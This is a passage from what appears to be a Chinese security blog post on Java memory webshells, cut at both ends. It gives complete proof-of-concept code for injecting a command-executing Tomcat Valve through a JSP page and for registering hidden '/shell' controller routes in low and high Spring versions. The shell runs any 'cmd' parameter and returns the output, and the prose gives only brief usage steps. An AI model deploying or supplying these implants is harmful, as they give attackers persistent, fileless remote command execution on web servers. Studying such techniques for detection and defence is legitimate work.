class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getFirst</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (first != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> first;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> basic;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最后通过调用<code>StandardEngineValve.invoke()</code>来实现Valve的各种业务逻辑</p><p>(<strong>这里调用<code>Engine</code>是因为<code>Engine</code>排第一位)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Select the Host to be used for this Request</span></span><br><span class="line">        <span class="type">Host</span> <span class="variable">host</span> <span class="operator">=</span> request.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// HTTP 0.9 or HTTP 1.0 request without a host when no default host</span></span><br><span class="line">            <span class="comment">// is defined.</span></span><br><span class="line">            <span class="comment">// Don&#x27;t overwrite an existing error</span></span><br><span class="line">            <span class="keyword">if</span> (!response.isError()) &#123;</span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (request.isAsyncSupported()) &#123;</span><br><span class="line">            request.setAsyncSupported(host.getPipeline().isAsyncSupported());</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Ask this Host to process this request</span></span><br><span class="line">        host.getPipeline().getFirst().invoke(request, response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>host.getPipeline().getFirst().invoke(request, response)</code>实现调用后续的Valve。</p><p><strong>(就是调用<code>host</code>自身的<code>Valve</code>)</strong></p><h4 id="动态添加Valve"><a href="#动态添加Valve" class="headerlink" title="动态添加Valve"></a>动态添加Valve</h4><p>根据上文的分析我们能够总结出Valve型内存马的注入思路</p><ol><li>获取<code>StandardContext</code>对象</li><li>通过<code>StandardContext</code>对象获取<code>StandardPipeline</code></li></ol><p><img src="../images/image-20230802120648587.png" alt="image-20230802120648587"></p><p>就是这里来获取到这个<code>StandardPipeline</code>d的  所以我手动添加</p><ol><li><p>编写恶意Valve</p></li><li><p>通过<code>StandardPipeline.addValve()</code>动态添加Valve</p></li></ol><p>这里添加是为了<code>getFirst</code>()的时候能够调用到  并且执行这个传进来的<code>Valve</code>里的<code>invoke</code>方法</p><h5 id="获取StandardContext和StandardPipeline对象"><a href="#获取StandardContext和StandardPipeline对象" class="headerlink" title="获取StandardContext和StandardPipeline对象"></a>获取StandardContext和StandardPipeline对象</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Pipeline</span> <span class="variable">pipeline</span> <span class="operator">=</span> standardContext.getPipeline();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="编写恶意Valve类"><a href="#编写恶意Valve类" class="headerlink" title="编写恶意Valve类"></a>编写恶意Valve类</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Shell_Valve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="将恶意Valve添加进StandardPipeline"><a href="#将恶意Valve添加进StandardPipeline" class="headerlink" title="将恶意Valve添加进StandardPipeline"></a>将恶意Valve添加进StandardPipeline</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Shell_Valve</span> <span class="variable">shell_valve</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Valve</span>();</span><br><span class="line">    pipeline.addValve(shell_valve);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="完整POC-3"><a href="#完整POC-3" class="headerlink" title="完整POC"></a>完整POC</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Pipeline</span> <span class="variable">pipeline</span> <span class="operator">=</span> standardContext.getPipeline();</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Shell_Valve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Shell_Valve</span> <span class="variable">shell_valve</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Valve</span>();</span><br><span class="line">    pipeline.addValve(shell_valve);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><strong>访问<code>Valve.jsp</code>将内存马写入</strong></p><p><img src="../images/image-20230802122012848.png" alt="image-20230802122012848"></p><p><strong>然后直接命令执行就行了</strong></p><p><img src="../images/image-20230802122102870.png" alt="image-20230802122102870"></p><h2 id="Spring内存马"><a href="#Spring内存马" class="headerlink" title="Spring内存马"></a>Spring内存马</h2><p><a href="https://goodapple.top/archives/1355">介绍Spring </a>   这篇文章有介绍<code>Spring</code>的   建议直接去就行  这里就不写了</p><p>关于<strong>Spring内存马</strong>一共有两种类型  就是<code>Controller</code>和<code>Interceptor</code>这两种类型</p><p>这里的就不多写了  因为看不太懂  太绕了</p><p><strong>直接写实现思路了</strong></p><h3 id="Controller型内存马"><a href="#Controller型内存马" class="headerlink" title="Controller型内存马"></a>Controller型内存马</h3><h4 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h4><p>和Tomcat内存马类似，我们就需要了解如何动态的注册Controller，思路如下</p><ol><li>获取上下文环境</li><li>注册恶意Controller</li><li>配置路径映射</li></ol><p><strong>(前面省略了很多步骤没写  可以去看 <a href="https://goodapple.top/archives/1355">这篇文章</a>来加深理解  我没写是因为我单纯看不懂…………………..)</strong></p><h4 id="完整POC-4"><a href="#完整POC-4" class="headerlink" title="完整POC"></a>完整POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shell.controller;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell_controller</span> &#123;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//    @ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/control&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Spring_Controller</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//获取当前上下文环境</span></span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//手动注册Controller</span></span><br><span class="line">        <span class="comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span></span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">r</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="comment">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> Controller_Shell.class.getDeclaredMethod(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">        <span class="comment">// 3. 定义访问 controller 的 URL 地址</span></span><br><span class="line">        <span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/shell&quot;</span>);</span><br><span class="line">        <span class="comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span></span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="comment">// 5. 在内存中动态注册 controller</span></span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, ms, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        r.registerMapping(info, <span class="keyword">new</span> <span class="title class_">Controller_Shell</span>(), method);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Controller_Shell</span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Controller_Shell</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取request</span></span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">            Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是刚访问<code>/control</code>路由的时候会显示未找到  返回404<br><img src="../images/image-20230802165406953.png" alt="image-20230802165406953"></p><p>这样就会将内存马写入进去  </p><p>然后访问<code>/shell</code>执行命令就会成功</p><p><img src="../images/image-20230802165941542.png" alt="image-20230802165941542"></p><p>结束了</p><h5 id="高版本spring内存马-上面是低版本"><a href="#高版本spring内存马-上面是低版本" class="headerlink" title="高版本spring内存马(上面是低版本)"></a>高版本spring内存马(上面是低版本)</h5><h6 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h6><p> <strong>在这篇文章上面用的是<code>spring 5.3.19</code>版本</strong> 对应<code>springboot2.6</code>及以下版本，但是现在<code>SpringBoot</code>已经在<code>3.x</code>版本了，在这种条件下我们该如何去打进内存马呢？</p><h6 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h6><p><img src="../images/image-20230808161149104.png" alt="image-20230808161149104"></p><p>PathPattern改为了<code>AntPathMatcher</code></p><p><strong>其实这里本质上的不同就是在获取这个路由的方法不同</strong></p><p><img src="../images/image-20230808162011536.png" alt="image-20230808162011536"></p><p><img src="../images/image-20230808162422020.png" alt="image-20230808162422020"></p><p>高版本的spring与低版本的差别就是在这了  获取<code>RequestMappingInfo</code>的方法不同(<strong>就是获取路由的方法不同</strong>)</p><p>总的来说就是步骤和这个低版本的spring内存马是一样的  差别只是在这个获取<code>RequestMappingInfo</code>方法</p><h6 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springshell.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilShell</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    @ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/control&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Spring_Controller</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;i am in&quot;</span>);</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">        configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span></span><br><span class="line">                (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> Controller_Shell.class.getMethod(<span class="string">&quot;shell&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/shell&quot;</span>)</span><br><span class="line">                .options(config)</span><br><span class="line">                .build();</span><br><span class="line">        <span class="type">Controller_Shell</span> <span class="variable">springControllerMemShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Controller_Shell</span>();</span><br><span class="line">        mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Controller_Shell</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Interceptor型内存马"><a href="#Interceptor型内存马" class="headerlink" title="Interceptor型内存马"></a>Interceptor型内存马</h3><h4 id="什么是Interceptor"><a href="#什么是Interceptor" class="headerlink" title="什么是Interceptor"></a>什么是Interceptor</h4><p>Spring MVC 的拦截器（Interceptor）与 Java Servlet 的过滤器（Filter）类似，它主要用于拦截用户的请求并做相应的处理，通常应用在权限验证、记录请求信息的日志、判断用户是否登录等功能上。</p><p>在 Spring MVC 框架中定义一个拦截器需要对拦截器进行定义和配置，主要有以下 2 种方式。</p><ul><li>通过实现 HandlerInterceptor 接口或继承 HandlerInterceptor 接口的实现类（例如 HandlerInterceptorAdapter）来定义</li><li>通过实现 WebRequestInterceptor 接口或继承 WebRequestInterceptor 接口的实现类来定义</li></ul><h4 id="Interceptor示例"><a href="#Interceptor示例" class="headerlink" title="Interceptor示例"></a>Interceptor示例</h4><p>这里我们选择继承HandlerInterceptor接口来实现一个Interceptor。HandlerInterceptor接口有三个方法，如下</p><ul><li>preHandle：该方法在<strong>控制器</strong>的处理请求方法前执行，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。</li><li>postHandle：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。</li><li>afterCompletion：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。</li></ul><p>这里对构造内存马来说最重要的是这个<code>preHandle</code>方法</p><p><strong>就是如上面所说的  就是在控制器处理请求之前执行</strong></p><p>(这里的话就是涉及到这个开发的MVC知识  了解过的话看这里会容易一点)</p><p>写个demo来判断一下是否是这个样子</p><ul><li><p><strong>Controller</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 